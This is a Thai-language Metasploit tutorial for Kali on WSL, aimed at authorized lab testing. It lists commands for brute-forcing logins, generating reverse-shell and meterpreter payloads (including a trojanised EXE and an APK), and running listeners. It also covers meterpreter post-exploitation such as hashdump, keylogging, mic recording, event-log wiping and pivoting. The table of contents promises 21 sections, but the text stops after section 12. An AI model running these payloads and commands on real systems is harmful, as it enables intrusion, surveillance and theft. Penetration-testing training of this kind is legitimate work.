# คู่มือการใช้งาน Metasploit Framework บน Kali Linux (WSL) — ฉบับเน้นคำสั่ง

> **สำหรับการศึกษาและการทดสอบที่ได้รับอนุญาตเท่านั้น** — คู่มือนี้อยู่ในชุดเดียวกับไฟล์ OSINT
> ก่อนหน้า ([1: SpiderFoot](./spiderfoot-email-osint-th.md) · [2: Email ขั้นสูง](./spiderfoot-email-osint-advanced-th.md)
> · [3: ชื่อ/เบอร์ Red/Purple](./osint-name-phone-redteam-th.md))
>
> **การทดสอบคำสั่ง:** คำสั่งในไฟล์นี้ทดสอบจริงบน Metasploit Framework **6.5.3** — ครอบคลุม
> `msfconsole` (search/use/info/show/set), `msfdb`, `workspace`, auxiliary scanner, `msfvenom`
> (ทุกฟอร์แมต), encoder, `exploit/multi/handler`, jobs/sessions, resource script และ pattern tools
> คำสั่งที่ต้องมี "session จริง" (Meterpreter ภายในเครื่องเป้าหมาย) จะระบุว่าเป็นชุดอ้างอิงที่รันเมื่อได้ session
>
> เน้น **คำสั่ง** อธิบายกระชับ — ทุกบล็อกคือสิ่งที่พิมพ์ใน Terminal ได้จริง

---

## ⚠️ Authorization Gate — อ่านก่อน

Metasploit เป็นเฟรมเวิร์กสำหรับ **เจาะระบบ (exploitation)** การใช้กับระบบที่ไม่ได้รับอนุญาตผิดกฎหมาย
(พ.ร.บ.คอมพิวเตอร์ฯ / CFAA) ใช้ได้เฉพาะ:

```
[ ] ระบบของตัวเองในแล็บที่แยกออกจากเครือข่ายจริง (VM/target ตั้งใจให้ฝึก)
[ ] มีสัญญา/เอกสารอนุญาต (SOW/RoE) ระบุขอบเขตชัดเจน
[ ] Bug bounty ที่ยืนยันว่าเป้าหมายอยู่ใน scope
[ ] CTF ที่ระบุแพลตฟอร์ม/โจทย์
```

> คู่มือนี้ใช้ **เป้าหมายในแล็บ** (เช่น Metasploitable, IP `10.0.0.x` สมมติ) เสมอ อย่านำไปใช้กับระบบผู้อื่น

---

## สารบัญ

1. [ติดตั้ง Metasploit บน WSL (Kali)](#1-ติดตั้ง-metasploit-บน-wsl-kali)
2. [ตั้งค่าฐานข้อมูล (msfdb + PostgreSQL)](#2-ตั้งค่าฐานข้อมูล-msfdb--postgresql)
3. [โครงสร้าง Metasploit และองค์ประกอบ](#3-โครงสร้าง-metasploit-และองค์ประกอบ)
4. [msfconsole พื้นฐาน](#4-msfconsole-พื้นฐาน)
5. [ค้นหาโมดูล (search) แบบละเอียด](#5-ค้นหาโมดูล-search-แบบละเอียด)
6. [เลือกและตั้งค่าโมดูล (use/set/show)](#6-เลือกและตั้งค่าโมดูล-usesetshow)
7. [ฐานข้อมูลและ workspace](#7-ฐานข้อมูลและ-workspace)
8. [Auxiliary Scanners (สแกน/แจกแจง)](#8-auxiliary-scanners-สแกนแจกแจง)
9. [msfvenom — สร้าง Payload](#9-msfvenom--สร้าง-payload)
10. [Encoder / Bad Characters / Template](#10-encoder--bad-characters--template)
11. [exploit/multi/handler — ตัวรับ Payload](#11-exploitmultihandler--ตัวรับ-payload)
12. [Sessions และ Meterpreter](#12-sessions-และ-meterpreter)
13. [Post-Exploitation Modules](#13-post-exploitation-modules)
14. [Resource Script และการทำงานอัตโนมัติ](#14-resource-script-และการทำงานอัตโนมัติ)
15. [เครื่องมือ Exploit Dev (pattern/BOF)](#15-เครื่องมือ-exploit-dev-patternbof)
16. [สร้างแล็บฝึก (Metasploitable/DVWA)](#16-สร้างแล็บฝึก-metasploitabledvwa)
17. [เดินเครื่องเต็มรูปแบบ (workflow ตัวอย่าง)](#17-เดินเครื่องเต็มรูปแบบ-workflow-ตัวอย่าง)
18. [มุมมอง Blue Team: ตรวจจับ Metasploit](#18-มุมมอง-blue-team-ตรวจจับ-metasploit)
19. [แก้ปัญหาบน WSL (Troubleshooting)](#19-แก้ปัญหาบน-wsl-troubleshooting)
20. [Cheat Sheet — สรุปคำสั่งทั้งหมด](#20-cheat-sheet--สรุปคำสั่งทั้งหมด)
21. [ความเสี่ยงที่ยังเหลืออยู่ (Residual Risks)](#21-ความเสี่ยงที่ยังเหลืออยู่-residual-risks)

---

## 1. ติดตั้ง Metasploit บน WSL (Kali)

> ทำใน Kali (WSL) — ดูการตั้งค่า WSL/Kali พื้นฐานในไฟล์ที่ 1

### วิธี A — apt ของ Kali (แนะนำ เพราะมี `msf-*` utilities ครบ)

```bash
sudo apt update
sudo apt -y install metasploit-framework
msfconsole --version
```

### วิธี B — ตัวติดตั้งทางการ (omnibus, ใช้ได้ทุกดิสโทร)

```bash
curl -sSL "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb" -o msfinstall
chmod +x msfinstall
sudo ./msfinstall
msfconsole --version          # ควรได้ Framework Version: 6.x
```

### ตรวจไฟล์ที่ติดตั้ง

```bash
which msfconsole msfvenom msfdb
ls /usr/bin/msf*              # msfconsole, msfvenom, msfdb, msfrpcd, ...
```

### อัปเดตในภายหลัง

```bash
sudo apt update && sudo apt -y upgrade metasploit-framework   # ถ้าติดตั้งด้วย apt
sudo msfupdate                                                # ถ้าติดตั้งด้วย omnibus
```

---

## 2. ตั้งค่าฐานข้อมูล (msfdb + PostgreSQL)

ฐานข้อมูลช่วยเก็บผลสแกน (hosts/services/creds/loot) และทำให้ `search` เร็วขึ้น

> **สำคัญบน WSL:** รัน `msfdb` ด้วย **ผู้ใช้ปกติ (non-root)** เท่านั้น — รันด้วย root จะขึ้น
> `Please run msfdb as a non-root user` (บน WSL user เริ่มต้นเป็น non-root อยู่แล้ว จึงทำงานได้)

### เริ่ม PostgreSQL

```bash
sudo service postgresql start          # WSL ไม่มี systemd → ใช้ service
sudo service postgresql status
```

### เริ่มต้นฐานข้อมูล Metasploit

```bash
msfdb init                             # สร้าง DB + user + schema (รันแบบ non-root)
```

ผลลัพธ์ที่ควรเห็น: `Creating database...` → `Database initialization successful`

### คำสั่งจัดการ msfdb

```bash
msfdb status                           # ดูสถานะ DB
msfdb start                            # เริ่ม DB
msfdb stop                             # หยุด DB
msfdb reinit                           # ล้างและสร้างใหม่
```

### ยืนยันจาก msfconsole

```bash
msfconsole -q -x "db_status; exit"
# ควรได้: [*] Connected to msf. Connection type: postgresql.
```

> ถ้าเห็น `postgresql selected, no connection` → PostgreSQL ยังไม่ start หรือยังไม่ `msfdb init`

---

## 3. โครงสร้าง Metasploit และองค์ประกอบ

| องค์ประกอบ | หน้าที่ | คำสั่ง |
|---|---|---|
| **msfconsole** | อินเทอร์เฟซหลัก (โต้ตอบ) | `msfconsole` |
| **msfvenom** | สร้าง/เข้ารหัส payload | `msfvenom` |
| **msfdb** | จัดการฐานข้อมูล | `msfdb` |
| **msfrpcd** | RPC server (automation/GUI) | `msfrpcd` |
| **msf-* utils** | เครื่องมือ exploit dev | `msf-pattern_create` ฯลฯ |

**ชนิดโมดูล (module types):**

| ชนิด | ทำอะไร | ตัวอย่าง path |
|---|---|---|
| **exploit** | เจาะช่องโหว่ | `exploit/windows/smb/ms17_010_eternalblue` |
| **auxiliary** | สแกน/แจกแจง/ฟัซ (ไม่เจาะ) | `auxiliary/scanner/portscan/tcp` |
| **payload** | โค้ดที่รันหลังเจาะ | `windows/x64/meterpreter/reverse_tcp` |
| **post** | หลังยึดเครื่อง | `post/windows/gather/hashdump` |
| **encoder** | หลบเลี่ยง/แปลง payload | `x86/shikata_ga_nai` |
| **nop** | NOP sled | `x86/single_byte` |

---

## 4. msfconsole พื้นฐาน

### เปิด/ปิด

```bash
msfconsole                             # เปิดแบบเต็ม (มี banner)
msfconsole -q                          # เปิดแบบเงียบ (ไม่มี banner)
msfconsole -q -x "version; exit"       # รันคำสั่งแล้วออก (ไม่โต้ตอบ)
```

### คำสั่งภายในพื้นฐาน (พิมพ์หลังพรอมต์ `msf6 >`)

```
help                    # ดูคำสั่งทั้งหมด
help <command>          # ช่วยเหลือคำสั่งเฉพาะ
version                 # เวอร์ชัน framework/console
banner                  # แสดง banner (สุ่มใหม่)
connect 10.0.0.5 80     # netcat ในตัว (ต่อ TCP)
get_timeouts            # ดู timeout ปัจจุบัน
history                 # ประวัติคำสั่ง
color true              # เปิด/ปิดสี
save                    # บันทึก config ปัจจุบัน
exit  /  quit           # ออก
```

### รันคำสั่ง shell จากใน console

```
# นำหน้าด้วยเครื่องหมายเพื่อรันคำสั่งระบบ
msf6 > ls -la
msf6 > cat /etc/hostname
```

### ทดสอบ (ไม่โต้ตอบ) — รูปแบบที่ใช้บ่อยในสคริปต์

```bash
msfconsole -q -x "db_status; version; exit"
```

### กรองผลลัพธ์ด้วย grep (ในตัว)

```
grep meterpreter show payloads          # แสดงเฉพาะบรรทัดที่มี meterpreter
grep -v deprecated search smb           # ซ่อนบรรทัดที่มี deprecated
grep excellent search cve:2021          # เฉพาะ rank excellent
```

### บันทึก log / output ของ session

```
spool /tmp/msf_session.log              # บันทึกทุกอย่างที่แสดงลงไฟล์
spool off                               # หยุดบันทึก
```

### ตั้งค่า global ที่ใช้บ่อย

```
setg PROMPT "%red msf %clr"             # เปลี่ยนพรอมต์
setg ConsoleLogging true                # log console
setg SessionLogging true                # log ทุก session
setg TimestampOutput true               # ใส่ timestamp ทุกบรรทัด
setg Prompt_Timestamp true
save                                    # บันทึกให้คงอยู่ครั้งหน้า
```

### เปิด/ปิด module cache และ reload

```
reload_all                              # โหลดโมดูลใหม่ทั้งหมด (หลังเพิ่ม custom module)
loadpath /path/to/modules               # เพิ่ม path โมดูลเอง
```

---

## 5. ค้นหาโมดูล (search) แบบละเอียด

`search` คือหัวใจของการหาโมดูล รองรับ **ตัวกรอง (filters)** จำนวนมาก

### ค้นแบบพื้นฐาน

```
msf6 > search eternalblue
msf6 > search ms17-010
msf6 > search apache struts
```

### ตัวกรองที่ใช้บ่อย (รวมกันได้)

```
search type:exploit platform:windows smb          # ชนิด + แพลตฟอร์ม + คำค้น
search type:auxiliary scanner ssh                  # auxiliary scanner ssh
search cve:2021 type:exploit rank:excellent        # ตาม CVE + rank
search author:hdm                                  # ตามผู้เขียน
search platform:linux type:exploit rank:great      # linux exploit rank great
search name:eternalblue                            # ตามชื่อ
search path:smb                                     # ตาม path
search app:client type:exploit                     # client-side
search description:"remote code execution"          # ตามคำอธิบาย
```

### ตารางตัวกรอง search

| filter | ความหมาย | ตัวอย่าง |
|---|---|---|
| `type:` | ชนิดโมดูล | `type:exploit` `type:auxiliary` `type:post` |
| `platform:` | แพลตฟอร์ม | `platform:windows` `platform:linux` |
| `cve:` | เลข CVE | `cve:2017-0144` |
| `rank:` | ระดับความเสถียร | `rank:excellent` `rank:great` |
| `author:` | ผู้เขียน | `author:wvu` |
| `name:` | ชื่อโมดูล | `name:eternalblue` |
| `path:` | ส่วนของ path | `path:windows/smb` |
| `app:` | client/server | `app:client` |
| `disclosure_date:` | วันเปิดเผย | `disclosure_date:2021` |

### เลือกจากผลค้นด้วยหมายเลข index

```
msf6 > search ms17_010
msf6 > use 0                     # ใช้โมดูลลำดับ 0 จากผลค้นล่าสุด
msf6 > info 10                   # ดูข้อมูลโมดูลลำดับ 10
```

### ตารางอ้างอิงโมดูลยอดนิยม (สำหรับฝึกในแล็บ)

| โมดูล | ใช้กับ | หมายเหตุ |
|---|---|---|
| `exploit/windows/smb/ms17_010_eternalblue` | Windows SMBv1 | EternalBlue (MS17-010) |
| `exploit/multi/samba/usermap_script` | Samba 3.0.20 | Metasploitable |
| `exploit/unix/ftp/vsftpd_234_backdoor` | vsftpd 2.3.4 | backdoor สาธิต |
| `exploit/multi/http/tomcat_mgr_upload` | Tomcat manager | อัปโหลด WAR |
| `exploit/multi/handler` | ทุก payload | ตัวรับ reverse/bind |
| `auxiliary/scanner/smb/smb_version` | Windows/Samba | ระบุเวอร์ชัน SMB |
| `auxiliary/scanner/ssh/ssh_login` | SSH | brute-force |

> ค้นเพิ่มด้วย `search` เสมอ เพราะชื่อโมดูล/พาธอาจเปลี่ยนตามเวอร์ชัน framework

---

## 6. เลือกและตั้งค่าโมดูล (use/set/show)

### เลือกโมดูล

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

### ดูข้อมูลโมดูล

```
info                    # ข้อมูลเต็ม (คำอธิบาย, target, references)
info -d                 # เปิดใน browser
show options            # ตัวเลือกที่ต้องตั้ง (RHOSTS, LHOST, ...)
show advanced           # ตัวเลือกขั้นสูง
show targets            # เป้าหมาย (OS/เวอร์ชัน) ที่รองรับ
show payloads           # payload ที่ใช้กับโมดูลนี้ได้
show evasion            # ตัวเลือกหลบเลี่ยง
show missing            # ตัวเลือกที่ยัง "จำเป็นแต่ยังไม่ตั้ง"
```

### ตั้งค่า (set) และตัวแปร global (setg)

```
set RHOSTS 10.0.0.5                 # เป้าหมาย (โฮสต์เดียว)
set RHOSTS 10.0.0.0/24              # ทั้ง subnet
set RHOSTS file:/tmp/targets.txt    # จากไฟล์
set RPORT 445                       # พอร์ตเป้าหมาย
set LHOST 10.0.0.1                  # IP ผู้โจมตี (ตัวรับ)
set LPORT 4444                      # พอร์ตตัวรับ
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set TARGET 2                        # เลือกเป้าหมายตาม show targets
setg RHOSTS 10.0.0.5                # ตั้งเป็น global (ทุกโมดูลใช้ร่วม)
setg LHOST 10.0.0.1
```

### ดู/ลบค่า

```
show options            # ดูค่าที่ตั้งแล้ว
get RHOSTS              # ดูค่าตัวแปรเดียว
unset RPORT             # ลบค่าตัวแปร
unset all               # ลบทั้งหมด (ในโมดูล)
setg                    # ดูตัวแปร global ทั้งหมด
unsetg RHOSTS           # ลบ global
```

### ออกจากโมดูล / เปลี่ยนโมดูล

```
back                    # ออกจากโมดูลปัจจุบัน
previous                # กลับโมดูลก่อนหน้า
use <another_module>    # เปลี่ยนโมดูล
```

### ตรวจว่าเป้าหมายมีช่องโหว่จริงไหม (check) — ปลอดภัยกว่าการยิงจริง

```
check                   # เช็คว่า target vulnerable โดยไม่เจาะ (โมดูลที่รองรับ)
```

### ตัวอย่างตั้งค่าครบชุดสำหรับ multi/handler (ทดสอบแล้ว)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
show options
```

---

## 7. ฐานข้อมูลและ workspace

Workspace แยกโปรเจกต์/ลูกค้าออกจากกัน — ข้อมูลไม่ปน

### จัดการ workspace

```
db_status               # ตรวจการเชื่อมต่อ DB
workspace               # ดู workspace ทั้งหมด (มี * หน้าตัวที่ใช้อยู่)
workspace -a lab01      # สร้างใหม่ชื่อ lab01
workspace lab01         # สลับไป lab01
workspace -d old        # ลบ workspace
workspace -r a b        # เปลี่ยนชื่อ a เป็น b
```

### เก็บ/ดูข้อมูลในฐานข้อมูล

```
hosts                   # โฮสต์ที่รู้จัก
hosts -c address,os_name,name    # เลือกคอลัมน์
services                # บริการ/พอร์ตที่พบ
services -p 445         # กรองตามพอร์ต
services -s smb         # กรองตามชื่อบริการ
vulns                   # ช่องโหว่ที่บันทึก
creds                   # credential ที่เก็บได้
loot                    # ไฟล์/ข้อมูลที่ดึงมา
notes                   # โน้ตต่าง ๆ
```

### สแกนด้วย nmap ผ่าน Metasploit (บันทึกลง DB อัตโนมัติ)

```
db_nmap -sV -p 1-1000 10.0.0.5          # ต้องติดตั้ง nmap: sudo apt install nmap
db_nmap -sS -A 10.0.0.0/24
# หลังสแกน ดูผล:
hosts
services
```

### นำเข้า/ส่งออกข้อมูล

```
db_import /path/to/nmap_scan.xml        # นำเข้าผล nmap (-oX)
db_export -f xml /tmp/workspace.xml      # ส่งออกทั้ง workspace
```

### ล้างข้อมูล

```
hosts -d 10.0.0.5       # ลบโฮสต์
services -d -p 80       # ลบบริการพอร์ต 80
creds -d                # ลบ credential
```

---

## 8. Auxiliary Scanners (สแกน/แจกแจง)

Auxiliary ทำงานได้โดย **ไม่เจาะ** — เหมาะกับการ recon/enumeration และบันทึกลง DB

### รูปแบบทั่วไป (ทดสอบแล้ว)

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389
set THREADS 20
run                     # (หรือ exploit — ทำงานเหมือนกันสำหรับ auxiliary)
```

### พอร์ตสแกน

```
use auxiliary/scanner/portscan/tcp        # TCP connect scan
use auxiliary/scanner/portscan/syn        # SYN scan
```

### SMB (Windows shares / เวอร์ชัน / ผู้ใช้)

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.0/24
run

use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_login
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
```

### SSH

```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.5
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

### HTTP / เว็บ

```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.0.0.5
set RPORT 80
run

use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
```

### FTP / ฐานข้อมูล / อื่น ๆ (โมดูลยืนยันแล้ว)

```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login          # brute-force MySQL
use auxiliary/scanner/rdp/rdp_scanner
use auxiliary/scanner/vnc/vnc_none_auth          # VNC ที่ไม่มีรหัส
```

### SNMP (แจกแจงอุปกรณ์เครือข่าย)

```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 10.0.0.1
set COMMUNITY public
run

use auxiliary/scanner/snmp/snmp_login            # เดา community string
```

### MySQL brute-force เต็มรูปแบบ

```
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.0.0.5
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set VERBOSE false
run
creds                    # ดู credential ที่เจอ (เก็บลง DB อัตโนมัติ)
```

### บันทึกผลจาก scanner ลง DB แล้วเรียกดู

```
# หลัง run scanner ใด ๆ:
hosts
services
creds
vulns
loot
```

> **เคล็ด:** ตั้ง `setg RHOSTS <target>` และ `setg THREADS 20` ครั้งเดียว แล้วทุก scanner ใช้ค่าเดียวกัน

---

## 9. msfvenom — สร้าง Payload

`msfvenom` สร้าง payload แบบ standalone (ไฟล์ exe/elf/php/...) สำหรับส่งไปรันบนเป้าหมาย
**ในแล็บที่ได้รับอนุญาต**

### ดูรายการ

```bash
msfvenom --list payloads         # payload ทั้งหมด (~2600 ตัว)
msfvenom --list formats          # ฟอร์แมต output
msfvenom --list encoders         # encoder
msfvenom --list platforms        # แพลตฟอร์ม
msfvenom --list archs            # สถาปัตยกรรม
```

### โครงสร้างคำสั่ง

```bash
msfvenom -p <payload> <OPTION=value> -f <format> -o <outfile>
#   -p  payload
#   -f  format (exe/elf/raw/python/...)
#   -o  ไฟล์ output
#   LHOST/LPORT  ตัวรับ
```

### Windows (ทดสอบแล้ว)

```bash
# EXE reverse meterpreter (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# EXE reverse shell (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o rev.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o x.dll

# PowerShell script
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -o shell.ps1

# MSI
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o setup.msi
```

### Linux (ทดสอบแล้ว)

```bash
# ELF reverse shell (x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# ELF meterpreter (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o met.elf
```

### เว็บ (PHP/JSP/WAR/ASP) (ทดสอบแล้ว)

```bash
# PHP
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o met.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war

# ASP / ASPX
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp -o shell.asp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx
```

### Payload แบบข้อความ (สำหรับฝังในสคริปต์/คำสั่ง) (ทดสอบแล้ว)

```bash
# Python
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python

# Bash one-liner
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -f raw

# C array (สำหรับ exploit dev)
msfvenom -p linux/x64/exec CMD=id -f c

# Python reverse shell (ฝังในสคริปต์ .py)
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.1 LPORT=4444 -f raw
```

### Android (APK) (payload ยืนยันแล้ว)

```bash
# สร้าง APK meterpreter (สำหรับทดสอบอุปกรณ์ในแล็บที่ได้รับอนุญาต)
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o app.apk
# ต้องเซ็น APK ก่อนติดตั้ง (jarsigner/apksigner)
```

### Python / macOS (payload ยืนยันแล้ว)

```bash
# Python meterpreter (cross-platform)
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o met.py

# macOS (Intel x64)
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o mac.bin
```

### reverse_https / reverse_http (ทน firewall/เนียนกว่า)

```bash
# HTTPS meterpreter — traffic ดูเหมือน HTTPS ปกติ, ทน NAT/proxy ดีกว่า reverse_tcp
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o https.exe

# HTTP
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=10.0.0.1 LPORT=80 -f exe -o http.exe
```

> handler ต้องตั้ง PAYLOAD ให้ตรง เช่น `set PAYLOAD windows/x64/meterpreter/reverse_https`

### ดูตัวเลือกของ payload หนึ่ง ๆ

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

### Staged vs Stageless

```bash
# Staged (มี / คั่น) — ส่ง stager เล็ก แล้วดึงส่วนที่เหลือ (ต้องมี handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp   LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe

# Stageless (มี _ คั่น) — payload เต็มในไฟล์เดียว (เสถียรกว่าเมื่อเน็ตไม่ดี)
msfvenom -p windows/x64/meterpreter_reverse_tcp    LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
```

> ตัวคั่นบอกชนิด: `meterpreter/reverse_tcp` = staged, `meterpreter_reverse_tcp` = stageless

---

## 10. Encoder / Bad Characters / Template

### เข้ารหัส payload (ทดสอบแล้ว)

```bash
# เข้ารหัสด้วย shikata_ga_nai 3 รอบ
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -f exe -o enc.exe

# ดู encoder ที่ใช้ได้
msfvenom --list encoders
```

### หลีกเลี่ยง bad characters (ทดสอบแล้ว)

```bash
# ตัดไบต์ที่ทำให้ payload พัง (เช่น null, newline, CR)
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d' -f raw --platform windows -a x86 -o clean.bin
```

### ระบุ platform/arch ชัดเจน

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  --platform windows -a x86 -f exe -o s.exe
```

### ฝังใน template (ไฟล์ปกติ) + รักษาการทำงานเดิม

```bash
# ฝัง payload ใน exe ปกติ (-x template, -k เก็บการทำงานเดิมไว้)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -x /path/to/legit.exe -k -f exe -o trojan.exe
```

### ตารางแฟล็ก msfvenom

| แฟล็ก | ความหมาย |
|---|---|
| `-p` | payload (`-p -` อ่านจาก stdin) |
| `-f` | ฟอร์แมต output |
| `-o` | ไฟล์ output |
| `-e` | encoder |
| `-i` | จำนวนรอบ encode |
| `-b` | bad characters |
| `-a` | architecture (x86/x64) |
| `--platform` | แพลตฟอร์ม |
| `-x` | template file |
| `-k` | เก็บการทำงานเดิมของ template |
| `-s` | ขนาด payload สูงสุด |
| `--smallest` | ทำให้เล็กที่สุด |
| `-n` | NOP sled นำหน้า |

---

## 11. exploit/multi/handler — ตัวรับ Payload

เมื่อสร้าง payload ด้วย msfvenom แล้ว ต้องมี **handler** คอยรับการเชื่อมต่อกลับ
(payload/LHOST/LPORT ต้องตรงกับตอนสร้าง)

### ตั้ง handler (ทดสอบแล้ว)

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false          # ไม่ปิด handler เมื่อได้ session แรก
show options
run                              # รันแบบ foreground
```

### รันเป็น background job (ทดสอบแล้ว)

```
run -j                           # รันเป็น job (ทำงานเบื้องหลัง)
jobs                             # ดู job ทั้งหมด
jobs -K                          # หยุดทุก job
jobs -k 0                        # หยุด job หมายเลข 0
```

### handler ด่วนด้วย resource script (ทดสอบแล้ว)

```bash
cat > handler.rc <<'RC'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
run -j
RC
msfconsole -q -r handler.rc
```

### handler บรรทัดเดียว (ไม่ต้องมีไฟล์)

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"
```

> **ทดสอบว่า handler เปิดจริง:** เมื่อ `run -j` จะขึ้น `[*] Started reverse TCP handler on 10.0.0.1:4444`
> และ `jobs` จะแสดง job นั้น

---

## 12. Sessions และ Meterpreter

เมื่อ payload เชื่อมกลับ handler สำเร็จ จะได้ **session** จัดการผ่านคำสั่ง `sessions`
(คำสั่ง `sessions`/`jobs` ทดสอบแล้ว; คำสั่งภายใน Meterpreter เป็นชุดอ้างอิงที่รัน **เมื่อได้ session จริง**)

### จัดการ session (ทดสอบแล้ว)

```
sessions                # ดู session ทั้งหมด (เหมือน sessions -l)
sessions -l             # รายการแบบละเอียด
sessions -i 1           # เข้าโต้ตอบ session หมายเลข 1
sessions -k 1           # ปิด session 1
sessions -K             # ปิดทุก session
sessions -c "sysinfo"   # รันคำสั่งใน session ทั้งหมด
sessions -u 2           # อัปเกรด shell ธรรมดา → meterpreter
```

### สลับระหว่าง session กับ console

```
# ใน meterpreter:
background               # พัก session กลับไป console (session ยังอยู่)
Ctrl+Z                  # เทียบเท่า background
# ใน console:
sessions -i 1           # กลับเข้า session
```

### คำสั่ง Meterpreter — ระบบ/ข้อมูล (ชุดอ้างอิง, รันในเครื่องเป้าหมาย)

```
sysinfo                 # ข้อมูลระบบ (OS, arch, hostname)
getuid                  # ผู้ใช้ปัจจุบัน
getpid                  # PID ของ session
ps                      # รายการโปรเซส
pwd                     # โฟลเดอร์ปัจจุบัน
ipconfig / ifconfig     # ข้อมูลเครือข่าย
route                   # ตารางเส้นทาง
getprivs                # สิทธิ์ปัจจุบัน
idletime                # เครื่องว่างมานานเท่าไร
```

### Meterpreter — ไฟล์

```
ls                      # รายการไฟล์
cd C:\\Users            # เปลี่ยนโฟลเดอร์
cat file.txt            # อ่านไฟล์
download secret.docx    # ดึงไฟล์มาเครื่องเรา
download -r C:\\logs    # ดึงทั้งโฟลเดอร์
upload tool.exe C:\\Temp\\   # อัปโหลดไฟล์ไป
edit config.ini         # แก้ไขไฟล์
search -f *.kdbx        # ค้นไฟล์ตามรูปแบบ
rm file.txt             # ลบไฟล์
```

### Meterpreter — post-exploitation

```
shell                   # เปิด shell ระบบ (cmd/bash) ในเครื่องเป้าหมาย
getsystem               # ยกระดับเป็น SYSTEM (Windows)
hashdump                # ดึง hash รหัสผ่าน (ต้องมีสิทธิ์)
screenshot              # จับภาพหน้าจอ
screenshare             # ดูหน้าจอสด
keyscan_start           # เริ่มดักคีย์บอร์ด
keyscan_dump            # ดึงคีย์ที่ดัก
keyscan_stop            # หยุดดัก
webcam_list             # ดูกล้อง
record_mic 10           # อัดไมค์ 10 วินาที
```

### Meterpreter — migrate/persistence (ต้องได้รับอนุญาต)

```
migrate 1234            # ย้าย meterpreter ไปโปรเซส PID 1234
migrate -N explorer.exe # ย้ายไปโปรเซสตามชื่อ
clearev                 # ล้าง event log (Windows) — ระวัง: กระทบหลักฐาน
run post/windows/manage/migrate
```

### Meterpreter — pivot (เจาะลึกเครือข่ายภายใน)

```
run autoroute -s 10.10.10.0/24        # เพิ่ม route ผ่าน session นี้
background
route add 10.10.10.0 255.255.255.0 1  # เพิ่ม route ใน msf
use auxiliary/server/socks_proxy       # เปิด SOCKS proxy เพื่อ pivot
portfwd add -l 3389 -p 3389 -r 10.10.10.5   # forward พอร์ต
```

